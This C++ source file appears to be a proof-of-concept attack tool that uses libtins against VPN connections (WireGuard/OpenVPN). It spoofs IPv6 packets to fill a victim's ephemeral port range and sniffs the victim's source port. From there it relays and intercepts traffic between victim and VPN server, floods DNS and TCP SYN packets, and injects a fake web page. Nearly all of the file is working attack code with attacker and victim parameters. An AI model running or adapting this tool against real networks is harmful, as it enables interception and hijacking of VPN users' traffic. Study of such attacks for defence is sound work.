#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>

using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;


// BEGIN: global variables
string html_response = R"(
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
)";
bool DEBUG=false;
bool dns_loop=false;
string webdnsserver_ip;
IP dns_pkt;

string public_iface;
string attacker_pub_ip;

string victim_ip;
unsigned short victim_port;

// The port for the VPN Server UDP-port shadow (reflection)
string vpn_ip;
unsigned short vpn_port;

// The port for the VPN-stripped TCP-port shadow (reflection)
unsigned short https_port;

volatile bool udp_continue_ephem = true;
volatile bool tcp_continue_ephem = true;


// END: global variables 

// BEGIN: Forward declaratins
int udp_bind_port(unsigned short tobind);
int tcp_bind_port(unsigned short tobind);
// END: Forward declaratins

void udp_fill_ephemeral_port_range() {
#define PORT_RANGE_START 32768
#define PORT_RANGE_END  61000
	// 32780
	PacketSender sender;
	NetworkInterface iface("tun-ipv6"); //public_iface);
	std::cout << "Starting to fill ephemeral port space" << std::endl;
	std::string attackerAddr = "fd00::1001";
	while (udp_continue_ephem) {
		for (unsigned short dport = PORT_RANGE_START;
				dport < PORT_RANGE_END; dport++) {
			IPv6 pkt = IPv6(victim_ip, attackerAddr) / UDP(dport, vpn_port) / RawPDU("DEADBEEF");
			IPv6& ip = pkt.rfind_pdu<IPv6>();
			ip.hop_limit(2);
			UDP& udp = pkt.rfind_pdu<UDP>();
			udp.dport(dport);
			sender.send(pkt, iface);
			usleep(10);
		}
		usleep(1000000);
	}
	std::cout<<"Victim Port Fill Complete\n";
}

bool _sniff_vpn_request_handler(PDU &some_pdu) {
//define IPPROTO_UDP 17

	PacketSender sender;
	// NetworkInterface iface("enp0s8");//public_iface);
	NetworkInterface iface("tun-ipv6");//public_iface);
	const IPv6 &ip = some_pdu.rfind_pdu<IPv6>();
	const UDP &udp = some_pdu.rfind_pdu<UDP>();
	const RawPDU& raw = udp.rfind_pdu<RawPDU>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if (ip.src_addr() == victim_ip) std::cout << "packet from victim recd\n";
	if (ip.src_addr() == victim_ip && ip.next_header() == IPPROTO_UDP) {
		victim_port =
			some_pdu.rfind_pdu<UDP>().sport();
		std::cout << "Victim sport=" << victim_port
			<< std::endl;
		if (udp_continue_ephem) {
			udp_bind_port(victim_port);
		}
		udp_continue_ephem = false;
		/* , "fd12:2345:6789:fe::fe"
		IPv6 pkt = IPv6(vpn_ip, "fd12:2345:6789:fe::fe") /
			UDP(vpn_port, victim_port) / raw;
		sender.send(pkt, iface);
		return false;
		*/
	}
	return true;
}

void dns_reroute() {
        PacketSender sender;
        NetworkInterface iface(public_iface);
	short stride = 5000;
	while (true) {
		for (short i = 35000; i < 65001; i+=stride) {
			std::cout << "inner: Attacker sending DNS packets" << std::endl;
			// TCP packets placed in the ASSURED state
			for (short j = i; j < i+stride; j++) {
				IPv6 pkt = IPv6(webdnsserver_ip) / UDP(53, j);
				sender.send(pkt);//, iface);
			}
			usleep(100000);

                }
		std::cout << "outer: Attacker sending DNS packets" << std::endl;
        }
}

void do_fill_table() {
        PacketSender sender;
        NetworkInterface iface(public_iface);
        while (true) {
		for (short i = 1; i < 35001; i++) {
                        // TCP packets placed in the ASSURED state
                        IPv6 pkt = IPv6(webdnsserver_ip) / TCP(54, i); 
                        TCP &tcp = pkt.rfind_pdu<TCP>(); 
                        tcp.seq(1); 
                        tcp.ack_seq(0); 
                        tcp.set_flag(TCP::SYN, 1); 
			sender.send(pkt);//, iface);
                }
        }
}


void sniff_vpn_request_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_vpn_request_handler);
}
/**
 * I Don't think I will need this code. I should be able to
 * just create the pivot entries, for the listening port(s)
 * and have it listen on 0.0.0.0 with a *.* cert or
 * something.
*/
bool _sniff_website_request_handler(PDU &some_pdu) {
	PacketSender sender;
	NetworkInterface iface(public_iface);
	const IPv6 &ip = some_pdu.rfind_pdu<IPv6>();
	const TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
	unsigned short vport;
//define IPPROTO_TCP 6 
        std::cout << "_sniff_website_request_handler" << std::endl;
	if (ip.src_addr() == victim_ip && ip.next_header() == IPPROTO_TCP) {
		vport =
			some_pdu.rfind_pdu<TCP>().sport();
		std::cout << "Vport=" << vport
			<< std::endl;
		IPv6 pkt = IPv6(victim_ip) / TCP(vport, 80) / RawPDU(html_response);
		IPv6& ip = pkt.rfind_pdu<IPv6>();
		TCP &tcp = pkt.rfind_pdu<TCP>();
		tcp.seq(12345);
		tcp.ack_seq(tcp.seq());
		tcp_continue_ephem = false;
		// tcp_bind_port();
		sender.send(pkt);//, iface);
		// This might be a problem. We might need to pre-emptivly drop
		// all the victim's TCP packets (like SYNs) to us so that our
		// kernel doesn't just respond with RST packets and screw up
		// the pivot in the OpenVPN server or something stupid, Or we
		// just have a webserver running on ourselves with the
		// compromised CERT... :} 
		return false;
	}
	return true;
}

int tcp_bind_port(unsigned short tobind) {
	int sockfd;
	struct sockaddr_in servaddr;

	if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr, 0, sizeof(servaddr));
	
	    // Filling server information
	servaddr.sin_family    = AF_INET; // IPv4
	servaddr.sin_addr.s_addr = INADDR_ANY;
	servaddr.sin_port = htons(tobind);

	    // Bind the socket with the server address
	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
	    sizeof(servaddr)) < 0 )
	{
		perror("bind failed");
		exit(-1);
	}
	return sockfd;
}


void sniff_website_request_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_vpn_request_handler);
}


void print_raw_pdu(const RawPDU& raw) {
        std::cout << "DNS payload: " << std::endl;
        for (int i = 0; i < raw.size(); i++) {
                std::cout << raw.payload()[i] << std::endl;
        }

}

/**
 *
		if (ip.src_addr() == victim_ip &&
				some_pdu.rfind_pdu<TCP>().dport() == 80) {
			TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
			vport = some_pdu.rfind_pdu<TCP>().sport();
			std::cout << "TCP - BALLSTEINs = Vport = " << vport
				<< std::endl;
			IP pkt = IP(victim_ip) / TCP(vport, 80) / RawPDU(html_response);
			IP& ip = pkt.rfind_pdu<IP>();
			TCP &tcp = pkt.rfind_pdu<TCP>();
			tcp.set_flag(TCP::SYN, 1);
			tcp.set_flag(TCP::ACK, 1);
			tcp.seq(12345);

			tcp.ack_seq(tcp.seq());
			tcp_continue_ephem = false;
			sender.send(pkt, iface);
		}
 *
 * */

bool sniff_tcp(PDU &some_pdu) {
	PacketSender sender;
	NetworkInterface iface(public_iface);
	const IPv6 &ip = some_pdu.rfind_pdu<IPv6>();
	const TCP &tcp = some_pdu.rfind_pdu<TCP>();
	if (ip.next_header() == IPPROTO_TCP) {
		if (ip.src_addr() == webdnsserver_ip &&
				some_pdu.rfind_pdu<TCP>().sport() == 54) {
			TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
			// std::cout << "Web server sent SYN/ACK" << std::endl;
			IPv6 pkt = IPv6(webdnsserver_ip) /
				TCP(54, tcp_req.dport());
			IPv6& ip = pkt.rfind_pdu<IPv6>();
			TCP &tcp = pkt.rfind_pdu<TCP>();
			tcp.set_flag(TCP::ACK, 1);
			tcp.seq(2);
			tcp.ack_seq(1);
			sender.send(pkt);//, iface);
		}
	}
	return true;
}
void sniff_tcp_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	// Sniffer sniffer("tun-ipv6", config);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(sniff_tcp);
}

bool relay_packet(PDU &some_pdu) {
	PacketSender sender;
	NetworkInterface iface("enp0s8");//public_iface);
	NetworkInterface iface_tun("tun-ipv6");//public_iface);
	
	unsigned short vport;
	const IPv6 &ip = some_pdu.rfind_pdu<IPv6>();
	const UDP &udp = some_pdu.rfind_pdu<UDP>();
	const RawPDU& raw = udp.rfind_pdu<RawPDU>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	if (ip.src_addr() == victim_ip && ip.next_header() == IPPROTO_UDP) {
		std::cout << "Received victim packet to vpn server: src="
			<< ip.src_addr() << ":" << udp.sport() 
			<< ", dst=" << ip.dst_addr() << ":"
			<< udp.dport() << ":" << ip.payload_length() << std::endl;
		if (!dns_loop && ip.payload_length() == 124) { // 124 for wireguard, 104 for openvpn
			dns_loop = true;
			std::cout << "Real DNS request: Received victim DNS request: src="
				<< ip.payload_length() << std::endl;
			/*
			dns_pkt = IP(vpn_ip) /
				UDP(vpn_port, victim_port) / raw;
			*/
			thread dns_reroute_thread(
					dns_reroute);
			dns_reroute_thread.detach();
		}
		// IPv6 pkt = IPv6(vpn_ip, "fd12:2345:6789:fe::fe") v5 deleted:
		//IPv6 pkt = IPv6(vpn_ip) / // added: v5
		IPv6 pkt = IPv6("fd00::2", "fd00::1001")/
			UDP(vpn_port, victim_port) / raw;
		sender.send(pkt, iface_tun); //); // , iface); v4 no iface
		// sender.send(pkt); // , iface);
	}
	else if (ip.src_addr() == vpn_ip &&
			ip.dst_addr() == attacker_pub_ip &&
			udp.dport() == victim_port) {
		std::cout << "Received vpn packet to victim: src="
			<< ip.src_addr() << ":" << udp.sport() 
			<< ", dst=" << ip.dst_addr() << ":" 
			<< udp.dport() << std::endl;
		IPv6 pkt = IPv6(victim_ip, "fd00::1001") /
			UDP(victim_port, vpn_port) / raw;
		//sender.send(pkt); // , iface);
		sender.send(pkt, iface_tun);
	} else {
		if (udp.sport() == 53) {
			std::cout << "Received something else: src="
				<< ip.src_addr() << ":" << udp.sport()
				<< ", dst=" << ip.dst_addr() << ":"
				<< udp.dport() << std::endl;
			print_raw_pdu(raw);
		}
	} 
	return true;
}

void relay_packet_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(relay_packet);
}



int udp_bind_port(unsigned short tobind) {
	int sockfd;
	struct sockaddr_in6 servaddr;

	if ( (sockfd = socket(AF_INET6, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr, 0, sizeof(servaddr));
	
	    // Filling server information
	servaddr.sin6_family    = AF_INET6; // IPv4
	servaddr.sin6_port = htons(tobind);
	servaddr.sin6_addr = IN6ADDR_ANY_INIT;
	// inet_pton(AF_INET6, IN6ADDR_ANY_INIT, &(servaddr.sin6_addr));

	    // Bind the socket with the server address
	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
	    sizeof(servaddr)) < 0 )
	{
		perror("bind failed");
		exit(-1);
	}
	return sockfd;
}


int main(int argc, char** argv) {
      
	if (argc != 8) {
		cout << "sike wrong number of args ---> (public_iface, attacker_pub_ip, victim_ip, vpn_ip, vpn_port, https_port, webdnsserver_ip)\n";
		return 0;
	}
	public_iface = argv[1];
	attacker_pub_ip = argv[2];

	victim_ip = argv[3]; // dns server IP

	vpn_ip = argv[4]; // dns server IP
	vpn_port = atoi(argv[5]);

	https_port = atoi(argv[6]);
	webdnsserver_ip = argv[7];

	// Need to bind to this port because the victim will send packets
	// to the tun interface's ip address and the VPN listening port 
	// tcp_bind_port(https_port);
	udp_bind_port(vpn_port);
	std::cout<<"Bound udp port\n";
        // Get the TCP boomerang ready	

	// thread sniff_http_request(sniff_website_request_handler);
	// sniff_http_request.detach();

        // Get the UDP boomerang ready	
	std::cout<<"Starting Port fill\n";
	thread ephemeral_scan_thread(udp_fill_ephemeral_port_range);
	ephemeral_scan_thread.detach();
	std::cout<<"Sniffing VPN Request\n";
	thread sniff_vpn_request(sniff_vpn_request_handler);
	sniff_vpn_request.join();

	std::cout << "Done, victim sport is " << victim_port <<
		std::endl;
	std::cout << "Starting VPN Relay" << victim_port <<
		std::endl;

	// These are causing issues with the attack working. 
	// thread fill_table_thread(do_fill_table);
	// fill_table_thread.detach();

	// thread sniff_tcp_thread(sniff_tcp_handler);
	// sniff_tcp_thread.detach();

	thread relay_thread(relay_packet_handler);
	relay_thread.join();

	return 0;
}
